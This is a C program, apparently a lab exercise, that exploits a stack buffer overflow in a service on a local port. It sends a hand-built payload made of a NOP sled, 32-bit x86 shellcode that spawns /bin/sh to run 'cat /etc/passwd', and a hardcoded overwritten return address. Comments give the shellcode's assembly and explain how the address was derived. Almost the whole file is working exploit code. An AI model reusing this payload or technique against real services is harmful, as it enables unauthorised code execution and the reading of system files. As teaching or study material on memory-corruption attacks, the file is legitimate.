#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE *outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}


// Return address is bf ff f4 74
char compromise[129] = {
	// no op instructions for padding
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	// The exploit itself
	// 	 bits 32
	// 	 nop
	// 	 nop
	// start:   jmp short codeEnd
	// start2:  pop esi
	// 	 xor eax, eax
	// 	 mov [byte esi + flagStr - exeStr -2], al
	// 	 mov [byte esi + cmdStr - exeStr - 1], al
	// 	 mov [byte esi + arrayAddr - exeStr - 1], al
	// 	 mov [byte esi + arrayAddr - exeStr + 12], eax
	// 	 mov [byte esi+arrayAddr-exeStr+0], esi ; Copy /bin into array addr[0]
	// 	 lea edi, [byte esi + flagStr - exeStr] ; Copy -c into array addr[1]
	// 	 mov [byte esi+arrayAddr-exeStr+4], edi
	// 	 lea edi, [byte esi + cmdStr - exeStr] ; Copy cat into array addr[2]
	// 	 mov [byte esi+arrayAddr-exeStr+8], edi
	// 	 mov al, 0x0b
	// 	 mov ebx, esi
	// 	 lea ecx, [byte esi + arrayAddr - exeStr]
	// 	 xor edx, edx
	// 	 int 0x80
	// codeEnd: call start2
	// exeStr:  db "/bin/shXy"
	// flagStr: db "-cX"
	// cmdStr:  db "cat /etc/passwd;exitX"
	// arrayAddr: dd 0xffffffff
	// 	 dd 0xffffffff
	// 	 dd 0xffffffff
	// 	 dd 0xffffffff
	// newAddr: dd newAddr-start
	0x90, 0xeb, 0x29, 0x5e, 0x31, 0xc0, 0x88, 0x46, 0x07, 0x88, 0x46, 0x0b, 0x88, 0x46, 0x20, 0x89,
	0x46, 0x2d, 0x89, 0x76, 0x21, 0x8d, 0x7e, 0x09, 0x89, 0x7e, 0x25, 0x8d, 0x7e, 0x0c, 0x89, 0x7e,
	0x29, 0xb0, 0x0b, 0x89, 0xf3, 0x8d, 0x4e, 0x21, 0x31, 0xd2, 0xcd, 0x80, 0xe8, 0xd2, 0xff, 0xff,
	0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x58, 0x79, 0x2d, 0x63, 0x58, 0x63, 0x61, 0x74,
	0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x3b, 0x65, 0x78, 0x69,
	0x74, 0x58, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff,
	// Overflowed return address. Size of exploit is 0x61. Stack pointer during coredump is
	// 0xbffff390
	// Therefore, the following address is 0xbffff390 - 0x61 - 0x04
	0x2b, 0xf3, 0xff , 0xbf,
	// Newline to tell gets to stop reading.
	'\n'
};

void Attack(FILE *outfile){
    fprintf(outfile,compromise);
    fflush(outfile);
}
